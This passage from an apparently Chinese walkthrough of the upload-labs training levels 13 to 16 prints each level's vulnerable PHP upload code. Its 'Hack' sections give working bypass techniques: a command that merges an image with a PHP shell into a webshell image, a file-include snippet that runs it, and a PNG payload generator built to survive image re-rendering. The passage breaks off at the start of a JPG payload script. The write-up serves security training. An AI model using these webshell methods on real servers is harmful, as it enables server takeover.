punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file_type</span> <span class="token operator">=</span> <span class="token function">getReailFileType</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file_type</span> <span class="token operator">==</span> <span class="token string">'unknown'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"文件未知，上传失败！"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_type</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"上传出错！"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>Hack:<br>先制作木马</p><pre><code>copy normal.jpg /b + shell.php /a webshell.jpg</code></pre><p>上传成功但是后缀不能改，所以通过包含丢出去</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="11.png" alt=""></p><h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>getimagesize()函数绕过<br>先看看getimagesize()函数干嘛的<br>etimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组<br><img src="12.png" alt=""><br>源码</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">isImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$types</span> <span class="token operator">=</span> <span class="token string">'.jpeg|.png|.gif'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">image_type_to_extension</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$types</span><span class="token punctuation">,</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">isImage</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"文件未知，上传失败！"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$res</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"上传出错！"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>Hack:<br>13一样，当你直接改后缀返回bool,但是和13一样的payload即可</p><h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>exif_imagetype函数绕过<br>exif_imagetype函数作用：<br>文档描述：exif_imagetype() reads the first bytes of an image and checks its signature.</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">isImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//需要开启php_exif模块</span>    <span class="token variable">$image_type</span> <span class="token operator">=</span> <span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$image_type</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token constant">IMAGETYPE_GIF</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"gif"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token constant">IMAGETYPE_JPEG</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"jpg"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token constant">IMAGETYPE_PNG</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"png"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">isImage</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"文件未知，上传失败！"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$res</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"上传出错！"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>hack：<br>和十三一样</p><h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>二次渲染绕过</p><pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$tmpname</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$target_path</span><span class="token operator">=</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 获得上传文件的扩展名</span>    <span class="token variable">$fileext</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//判断文件后缀与类型，合法才进行上传操作</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$fileext</span> <span class="token operator">==</span> <span class="token string">"jpg"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$filetype</span><span class="token operator">==</span><span class="token string">"image/jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpname</span><span class="token punctuation">,</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//使用上传的图片生成新的图片</span>            <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"该文件不是jpg格式的图片！"</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//给新图片指定文件名</span>                <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$newfilename</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".jpg"</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$newfilename</span><span class="token punctuation">;</span>                <span class="token function">imagejpeg</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"上传出错！"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$fileext</span> <span class="token operator">==</span> <span class="token string">"png"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$filetype</span><span class="token operator">==</span><span class="token string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpname</span><span class="token punctuation">,</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//使用上传的图片生成新的图片</span>            <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatefrompng</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"该文件不是png格式的图片！"</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                 <span class="token comment" spellcheck="true">//给新图片指定文件名</span>                <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$newfilename</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".png"</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$newfilename</span><span class="token punctuation">;</span>                <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                           <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"上传出错！"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$fileext</span> <span class="token operator">==</span> <span class="token string">"gif"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$filetype</span><span class="token operator">==</span><span class="token string">"image/gif"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmpname</span><span class="token punctuation">,</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//使用上传的图片生成新的图片</span>            <span class="token variable">$im</span> <span class="token operator">=</span> <span class="token function">imagecreatefromgif</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$im</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"该文件不是gif格式的图片！"</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//给新图片指定文件名</span>                <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$newfilename</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".gif"</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>                <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$newfilename</span><span class="token punctuation">;</span>                <span class="token function">imagegif</span><span class="token punctuation">(</span><span class="token variable">$im</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"上传出错！"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>hack:<br>和13一样传gif后发现有个问题就是渲染后内容变了<br><img src="13.png" alt=""><br>但是有些没变，GIF我们可以把我们要写的木马语句写入到没变的那一段即可<br>png可以脚本跑</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span>           <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span>           <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span>           <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span>           <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>           <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span>           <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span>           <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$r</span><span class="token punctuation">,</span> <span class="token variable">$g</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">imagesetpixel</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span><span class="token string">'./1.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>JPG生成</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token comment" spellcheck="true">/*    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().    It is necessary that the size and quality of the initial image are the same as those of the processed image.    1) Upload an arbitrary image via secured files upload script    2) Save the processed image and launch:    jpg_payload.php &lt;jpg_name.jpg>    In case of successful 